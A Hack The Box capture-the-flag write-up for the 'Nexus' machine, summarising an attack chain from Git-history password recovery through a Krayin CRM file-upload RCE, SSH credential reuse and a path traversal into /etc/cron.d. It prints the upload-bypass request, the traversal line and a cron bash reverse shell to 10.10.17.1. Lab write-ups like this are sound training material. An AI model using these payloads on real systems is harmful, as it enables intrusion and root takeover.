# Nexus — HTB Machine

![Platform](https://img.shields.io/badge/Platform-Hack%20The%20Box-9FEF00)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy)
![Type](https://img.shields.io/badge/Type-Linux-blue)
![Status](https://img.shields.io/badge/Status-Completed-success)

Recovering a "removed" password from Git commit history unlocks a Krayin CRM instance vulnerable to file-upload RCE, credential reuse pivots to SSH, and a root-run Gitea sync script with a path traversal bug hands over root via cron.

## Techniques Used

- Nmap port + version scanning
- Virtual host fuzzing
- OSINT / email harvesting
- Git commit history secret recovery
- File upload RCE exploitation (CVE-2026-38526)
- Burp Suite request manipulation
- Credential reuse for lateral movement
- Systemd timer enumeration
- Path traversal exploitation via `git fast-import`
- Cron-based privilege escalation

## Attack Summary

```text
Nmap --> 22 (ssh), 80 (http) --> nexus.htb
Vhost fuzzing --> billing.nexus.htb, git.nexus.htb
Careers page --> email leaked
Gitea commit history --> removed DB password recovered
Krayin CRM login --> version 3.1 --> CVE-2026-38526
PHP shell uploaded (Burp bypass) --> www-data
.env password reused --> SSH as jones --> user.txt
gitea-template-sync.timer --> path traversal in template-sync.py
Malicious template repo --> payload to /etc/cron.d/ --> root --> root.txt
```

## Key Vulnerabilities

**CVE-2026-38526** — Webkul Krayin CRM's `/admin/tinymce/upload` endpoint accepts arbitrary file types by trusting the declared `Content-Type` and filename extension rather than validating actual content, enabling PHP webshell upload.

**Path traversal in `template-sync.py`** — A root-run Gitea template-sync script builds its destination path directly from repository content:

```python
target = os.path.join(stage_path, filepath)   # no traversal validation
```

A file committed at `../../../../../etc/cron.d/x` escapes the intended staging directory and lands in a location root reads on a schedule.

## Request Analysis

### Upload Bypass (Burp Suite)
```http
# Original
Content-Disposition: form-data; name="file"; filename="shell.jpg"
Content-Type: image/jpeg

# Modified
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg
```

### Path Traversal Payload (git fast-import)
```text
M 100644 <blob-hash> ../../../../../etc/cron.d/reverse_shell
```

## Exploit Payload

**Cron reverse shell:**
```bash
* * * * * root bash -c 'bash -i >& /dev/tcp/10.10.17.1/4444 0>&1'
```

## Why It Works

| Factor | Explanation |
|---|---|
| Secrets recoverable from Git history | A password removed in a later commit is still visible in the diff |
| Weak upload validation | Krayin trusts client-supplied metadata over actual file content |
| Password reuse | App-level DB password doubles as a real system account password |
| Unsanitized path construction | User-controlled repository content dictates a root-privileged file write location |

## References

- CVE-2026-38526 — Webkul Krayin CRM RCE Vulnerability
- [revshells.com — Reverse Shell Generator](https://www.revshells.com/)
